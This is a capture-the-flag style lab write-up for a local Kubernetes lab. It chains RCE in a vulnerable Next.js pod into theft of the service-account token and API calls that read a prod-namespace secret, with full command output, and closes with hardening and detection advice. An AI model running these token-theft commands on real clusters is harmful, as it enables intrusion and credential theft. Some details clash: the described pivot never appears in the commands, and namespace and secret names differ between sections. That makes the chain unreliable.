# reat2shell: local breach

[Back](../README.md)

- [reat2shell: local breach](#reat2shell-local-breach)
  - [Capture Jewels](#capture-jewels)
    - [Pod Secret](#pod-secret)
    - [SA token](#sa-token)
    - [Cluster Secret](#cluster-secret)
  - [Attack Chain Summary](#attack-chain-summary)
  - [Hardening (later phases)](#hardening-later-phases)

---

## Capture Jewels

### Pod Secret

- app is accessible at `localhost:8080`

```sh
# test
python scripts/rce.py http://localhost:8080 id
# executable response:
# uid=0(root) gid=0(root) groups=0(root)

# get distro
python scripts/rce.py http://localhost:8080 "cat /etc/os-release"
# executable response:
# PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
# NAME="Debian GNU/Linux"
# VERSION_ID="12"
# VERSION="12 (bookworm)"
# VERSION_CODENAME=bookworm
# ID=debian
# HOME_URL="https://www.debian.org/"
# SUPPORT_URL="https://www.debian.org/support"
# BUG_REPORT_URL="https://bugs.debian.org/"

# get pod tier flag
python scripts/rce.py http://localhost:8080 "printenv CONTAINER_SECRET"
# CoNtAinEr-sEcRet-InsECurE
```

---

### SA token

```sh
# get
python scripts/rce.py http://localhost:8080 "ls -l /var/run/secrets/kubernetes.io/serviceaccount"
# executable response:
# total 0
# lrwxrwxrwx 1 root root 13 Oct  6 02:48 ca.crt -> ..data/ca.crt
# lrwxrwxrwx 1 root root 16 Oct  6 02:48 namespace -> ..data/namespace
# lrwxrwxrwx 1 root root 12 Oct  6 02:48 token -> ..data/token

# get ns
python scripts/rce.py http://localhost:8080 "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
# executable response:
# insecure

# get token
python scripts/rce.py http://localhost:8080 "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
# executable response:
# eyJhbGciOiJSUzI1NiIsImtpZCI6InU2WHhSQ0U3eXpiZlpfeWlHWGI0eDN3ck1iRkxGU0wzblVLck5tcEZwRjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jY...

# try request api
python scripts/rce.py http://localhost:8080 "curl -sS https://kubernetes.default.svc"
# curl: (77) error setting certificate file: /etc/ssl/certs/ca-certificates.crt

# request api
python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api"
# executable response:
# {
#   "kind": "APIVersions",
#   "versions": [
#     "v1"
#   ],
#   "serverAddressByClientCIDRs": [
#     {
#       "clientCIDR": "0.0.0.0/0",
#       "serverAddress": "172.19.0.3:6443"
#     }
#   ]
# }

python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure/pods"
# list all pods
      # "metadata": {
      #   "name": "leftover",
      #   "namespace": "insecure",
      # "spec": {
      #   "serviceAccountName": "leftover",
      #   "serviceAccount": "leftover",

      # "metadata": {
      #   "name": "react2shell-7cdb9b89b-zmzt9",
      #   "namespace": "insecure",
      # "spec": {
      #   "serviceAccountName": "react2shell",
      #   "serviceAccount": "react2shell",
```

---

### Cluster Secret

The pod now runs as the `frontend` SA (not `default`). That token **cannot** read
the db-namespace secret directly, but it **can** enumerate pods and exec into them.
The chain: recon with the frontend token → spot the over-privileged
`backend-leftover` pod → pivot into it → use its cluster-wide token to steal the
db secret.

```sh
# spot leftover pod
python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure/pods"
      # "metadata": {
      #   "name": "leftover",
      #   "namespace": "insecure",
      # "spec": {
      #   "serviceAccountName": "leftover",
      #   "serviceAccount": "leftover",

      # "metadata": {
      #   "name": "react2shell-7cdb9b89b-zmzt9",
      #   "namespace": "insecure",
      # "spec": {
      #   "serviceAccountName": "react2shell",
      #   "serviceAccount": "react2shell",

python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces"

# get cluster-secrets
python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/prod/secrets/cluster-secret"
# executable response:
# {
#   "kind": "Secret",
#   "apiVersion": "v1",
#   "metadata": {
#     "name": "cluster-secret",
#     "namespace": "prod",
#     "uid": "6ef0e914-a316-4b5e-9c4f-bb5e9be14df1",
#     "resourceVersion": "6366",
#     "creationTimestamp": "2026-10-06T02:40:33Z",
#     "annotations": {
#       "argocd.argoproj.io/tracking-id": "prod:/Secret:prod/cluster-secret",
#       "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{\"argocd.argoproj.io/tracking-id\":\"prod:/Secret:prod/cluster-secret\"},\"name\":\"cluster-secret\",\"namespace\":\"prod\"},\"stringData\":{\"password\":\"cLuSTer-SecReT\"},\"type\":\"Opaque\"}\n"
#     },
#     "managedFields": [
#       {
#         "manager": "argocd-controller",
#         "operation": "Update",
#         "apiVersion": "v1",
#         "time": "2026-10-06T02:40:33Z",
#         "fieldsType": "FieldsV1",
#         "fieldsV1": {
#           "f:data": {
#             ".": {},
#             "f:password": {}
#           },
#           "f:metadata": {
#             "f:annotations": {
#               ".": {},
#               "f:argocd.argoproj.io/tracking-id": {},
#               "f:kubectl.kubernetes.io/last-applied-configuration": {}
#             }
#           },
#           "f:type": {}
#         }
#       }
#     ]
#   },
#   "data": {
#     "password": "Y0x1U1Rlci1TZWNSZVQ="
#   },
#   "type": "Opaque"
# }

echo "Y0x1U1Rlci1TZWNSZVQ=" | base64 -d; echo
# cLuSTer-SecReT
```

---

## Attack Chain Summary

| #   | Stage                         | Enabled by (misconfig)                          | Result            |
| --- | ----------------------------- | ----------------------------------------------- | ----------------- |
| 1   | RCE in app pod                | pinned vulnerable Next.js (CVE-2025-55182)      | root shell in pod |
| 2   | Read pod env secret           | secret injected as `PWD_SECRET` env             | **pod flag**      |
| 3   | Steal SA token                | token auto-mounted in pod                       | frontend token    |
| 4   | Enumerate pods, spot leftover | `frontend` Role: get/list/watch pods            | recon             |
| 5   | Pivot into `backend-leftover` | `frontend` Role: `create pods/exec`             | backend token     |
| 6   | Read db secret                | `backend` **ClusterRoleBinding** (cluster-wide) | **cluster flag**  |

Every hop is load-bearing — remove any one misconfig and the chain breaks.

## Hardening (later phases)

Re-run the whole chain after each step; record which tier still falls (pod / cluster / cloud).

**Just-enough RBAC** (breaks steps 4–6)

- Replace the `backend` **ClusterRoleBinding** with a **RoleBinding in `db`** scoped
  to `resourceNames: [secret-cluster]` — or delete it. This alone stops the cluster flag.
- Drop `pods/exec` from the `frontend` Role → no pivot.
- Set `automountServiceAccountToken: false` on the app pod/SA → RCE gets no token (kills step 3).
- Audit: `kubectl auth can-i --list --as=system:serviceaccount:vuln:<sa>`, `rakkess`, `kubectl-who-can get secrets -A`.

**Scan for leftover / orphaned pods** (removes step 5's target)

- `kubectl get pods -A -o json | jq '.items[] | select(.metadata.ownerReferences==null) | .metadata.name'`
  — a bare Pod with no controller owner is the classic "leftover".
- Admission policy (**Kyverno / Gatekeeper**): deny pods with no ownerReference, and
  deny binding SAs that hold cluster-wide secret access.
- Cluster scanners: **Kubescape**, **Trivy k8s**, **kube-bench** (in CI + scheduled).

**Detection** (Phase 4 — Grafana + Loki)

- Alert on API-audit `pods/exec` events and on cross-namespace Secret `get`/`list`.
  Both the pivot and the db-secret read are loud in the audit log.

**Defense-in-depth**

- **NetworkPolicy**: deny egress from `vuln` workloads to the API server unless needed → step 4 can't reach the API.
- **Pod Security Standards (restricted)** + seccomp → shrink the RCE blast radius upstream.
